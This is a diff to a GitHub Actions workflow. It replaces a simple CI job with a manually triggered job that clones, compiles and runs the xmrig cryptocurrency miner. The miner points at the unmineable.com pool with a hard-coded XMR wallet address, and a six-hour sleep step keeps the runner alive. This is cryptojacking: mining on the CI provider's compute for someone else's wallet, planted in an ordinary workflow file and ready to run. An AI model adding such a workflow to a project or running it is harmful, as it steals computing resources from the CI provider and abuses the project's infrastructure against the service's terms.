@@ -1,17 +1,32 @@
-name: CI
+name: Install and Run xmrig
 
-on: push
+on:
+  workflow_dispatch:  # Allows for manual triggering of the workflow
 
 jobs:
-  build:
+  run-command:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        cpus: [1, 2, 4, 8] # Set the number of CPUs you want to use
+
     steps:
-      - name: Checkout code
+      - name: Check out repository
         uses: actions/checkout@v2
 
-      - name: Run a one-line script
-        run: echo "Using ${{ matrix.cpus }} CPUs"
-        
+      - name: Install dependencies and run xmrig
+        run: |
+          echo "Updating system and installing dependencies..."
+          apt update && \
+          apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
+          git clone https://github.com/xmrig/xmrig.git && \
+          cd xmrig && \
+          mkdir build && \
+          cd build && \
+          cmake .. && \
+          make && \
+          echo "Running xmrig..."
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_tsjcm#mvbs-zlx7 -p x
+
+      - name: Wait for 6 hours
+        run: |
+          echo "Waiting for 6 hours..."
+          sleep 21600  # Sleep for 6 hours (21600 seconds)
+          
